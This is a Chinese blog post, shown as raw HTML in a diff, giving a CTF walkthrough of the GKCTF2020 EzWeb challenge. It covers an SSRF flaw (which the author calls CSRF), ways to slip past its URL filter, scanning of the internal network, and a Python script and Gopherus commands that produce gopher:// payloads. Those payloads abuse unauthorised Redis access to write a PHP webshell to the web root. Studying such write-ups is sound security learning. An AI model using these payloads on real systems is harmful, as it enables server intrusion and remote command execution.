@@ -1,0 +1,390 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/logo.jpg?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/logo.jpg?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="1. 首页">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GKCTF2020-EZ三剑客-EzWeb">
+<meta property="og:url" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/index.html">
+<meta property="og:site_name" content="Sculptor&#39;s blog">
+<meta property="og:description" content="1. 首页">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/1.png">
+<meta property="og:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/2.png">
+<meta property="og:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/3.png">
+<meta property="og:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/4.png">
+<meta property="og:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/5.png">
+<meta property="og:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/6.png">
+<meta property="og:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/7.png">
+<meta property="og:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/8.png">
+<meta property="og:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/9.png">
+<meta property="og:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/10.png">
+<meta property="article:published_time" content="2021-04-26T13:30:32.000Z">
+<meta property="article:modified_time" content="2021-04-26T13:42:19.883Z">
+<meta property="article:author" content="Sculptor">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="Redis">
+<meta property="article:tag" content="伪协议">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/1.png"><title>GKCTF2020-EZ三剑客-EzWeb | Sculptor's blog</title><link ref="canonical" href="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: true,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-info-circle"></i></span><span class="header-nav-menu-item__text">关于我</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Sculptor's blog</div><div class="header-banner-info__subtitle">不知名的陌生人</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">GKCTF2020-EZ三剑客-EzWeb</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-04-26</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-04-26</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h2 id="1-首页">
+          <a href="#1-首页" class="heading-link"><i class="fas fa-link"></i></a>1. 首页</h2>
+      <p><img src="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/1.png"></p>
+<a id="more"></a>
+
+<p>F12查看网页源码，发现有提示<code>&lt;--?secret--&gt;</code></p>
+<p><img src="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/2.png"></p>
+<p>得到的源码</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?secret--&gt;</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr <span class="number">02</span>:<span class="number">42</span>:<span class="number">0</span>a:<span class="number">00</span>:<span class="number">40</span>:<span class="number">09</span>  </span><br><span class="line">          inet addr:<span class="number">10.0</span><span class="number">.64</span><span class="number">.9</span>  Bcast:<span class="number">10.0</span><span class="number">.64</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1450</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">35</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">29</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">0</span> </span><br><span class="line">          RX bytes:<span class="number">6997</span> (<span class="number">6.9</span> KB)  TX bytes:<span class="number">7218</span> (<span class="number">7.2</span> KB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr <span class="number">52</span>:<span class="number">54</span>:<span class="number">00</span>:<span class="number">9</span>b:<span class="number">70</span>:fe  </span><br><span class="line">          inet addr:<span class="number">10.128</span><span class="number">.0</span><span class="number">.170</span>  Bcast:<span class="number">10.128</span><span class="number">.255</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">81</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">0</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">0</span> </span><br><span class="line">          RX bytes:<span class="number">5215</span> (<span class="number">5.2</span> KB)  TX bytes:<span class="number">0</span> (<span class="number">0.0</span> B)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  Mask:<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">          UP LOOPBACK RUNNING  MTU:<span class="number">65536</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">22</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">22</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">          RX bytes:<span class="number">1949</span> (<span class="number">1.9</span> KB)  TX bytes:<span class="number">1949</span> (<span class="number">1.9</span> KB)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-CSRF">
+          <a href="#2-CSRF" class="heading-link"><i class="fas fa-link"></i></a>2. CSRF</h2>
+      <p>当在IP地址栏输入<code>baidu.com</code>的时候，会跳转到百度页面，说明它是一个CSRF</p>
+<p><img src="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/3.png"></p>
+
+        <h2 id="3-伪协议命令执行">
+          <a href="#3-伪协议命令执行" class="heading-link"><i class="fas fa-link"></i></a>3. 伪协议命令执行</h2>
+      <p>试一下file协议读文件</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///var/www/html/index.php</span></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/4.png"></p>
+<p>发现<code>file</code>被过滤，我们可以尝试绕过：<code>file：/</code>、<code>file:&lt;空格&gt;///</code></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:/<span class="keyword">var</span>/www/html/index.php</span><br><span class="line">file: <span class="comment">///var/www/html/index.php</span></span><br></pre></td></tr></table></div></figure>
+
+<p>F12得到index.php网页源码</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="4-代码审计">
+          <a href="#4-代码审计" class="heading-link"><i class="fas fa-link"></i></a>4. 代码审计</h2>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>从源码中可知过滤了<code>file</code>协议、<code>dict</code>协议、<code>127.0.0.1</code>和<code>localhost</code>，但没有过滤<code>http</code>协议和<code>gopher</code>协议<br>我们使用http协议进行内网主机存活探测。用burp抓包，跑字典。</p>
+
+        <h2 id="5-爆破内网IP">
+          <a href="#5-爆破内网IP" class="heading-link"><i class="fas fa-link"></i></a>5. 爆破内网IP</h2>
+      <p>对同一局域网下的IP进行扫描</p>
+<p><img src="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/5.png"></p>
+<p>这里扫到了10.0.64.6/5/7/9/11/4，这几台主机都存活，在看到10.0.64.11这台机子时给出了提示：</p>
+<p><img src="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/6.png"></p>
+
+        <h2 id="6-扫描端口">
+          <a href="#6-扫描端口" class="heading-link"><i class="fas fa-link"></i></a>6. 扫描端口</h2>
+      <p><img src="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/7.png"></p>
+<p>扫描到<code>6379</code>端口，<code>redis</code>服务，我们利用<code>redis</code>未授权访问的漏洞，在根目录下生成个文件<code>shell.php</code>，这里的<code>dict</code>协议也被过滤了，所以得用<code>gopher</code>协议。</p>
+
+        <h2 id="7-redis漏洞">
+          <a href="#7-redis漏洞" class="heading-link"><i class="fas fa-link"></i></a>7. redis漏洞</h2>
+      <p>大神的脚本：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="comment">#redis.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;10.0.64.11&quot;</span>      <span class="comment">#运行有redis的主机ip</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="keyword">print</span> payload</span><br></pre></td></tr></table></div></figure>
+
+<p>得到脚本：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:<span class="comment">//10.0.64.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/8.png"></p>
+<p>将生成的payload打过去，在根目录下生成一个文件<code>shell.php</code>发现这样不行，payload还必须在那个代替输入，应该是编码的问题，不然直接在url里打就行了或在kali中，在那个输入框输入之后再访问<code>10.0.64.11/shell.php</code>。</p>
+<p><img src="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/9.png"></p>
+
+        <h2 id="8-gopherus制造shell">
+          <a href="#8-gopherus制造shell" class="heading-link"><i class="fas fa-link"></i></a>8. gopherus制造shell</h2>
+      <p>工具下载：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd Gopherus-master</span><br><span class="line">chmod <span class="number">777</span> install.sh</span><br><span class="line">./install.sh</span><br><span class="line"></span><br><span class="line">gopherus --exploit redis</span><br><span class="line"></span><br><span class="line">PHPShell              <span class="comment">//在var/www/html目录下生成脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> system(<span class="string">&quot;cat /flag&quot;</span>)   <span class="comment">//要执行的命令</span></span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/10.png"></p>
+<p>生成payload：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:<span class="comment">//127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0Aecho%20system%28%22cat%20/flag%22%29%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span></span><br></pre></td></tr></table></div></figure>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://sculptor-liu.github.io">Sculptor</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/">https://sculptor-liu.github.io/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://sculptor-liu.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://sculptor-liu.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://sculptor-liu.github.io/tags/CSRF/">CSRF</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://sculptor-liu.github.io/tags/Redis/">Redis</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://sculptor-liu.github.io/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/">伪协议</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://sculptor-liu.github.io/tags/%E5%86%85%E7%BD%91/">内网</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><div class="post-reward reward"><div class="reward-button">请我喝杯咖啡~</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/images/ali_pay.png"><div class="reward-qrcode-alipay__text">支付宝打赏</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/images/wechat_pay.png"><div class="reward-qrcode-wechat__text">微信打赏</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/04/26/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">GKCTF2020-EZ三剑客-EzNode</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/04/26/Centos%E4%B8%ADiptables%E9%85%8D%E7%BD%AE/"><span class="paginator-prev__text">Centos中iptables配置</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="gitalk-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A6%96%E9%A1%B5"><span class="toc-number">1.</span> <span class="toc-text">
+          1. 首页</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-CSRF"><span class="toc-number">2.</span> <span class="toc-text">
+          2. CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">
+          3. 伪协议命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">4.</span> <span class="toc-text">
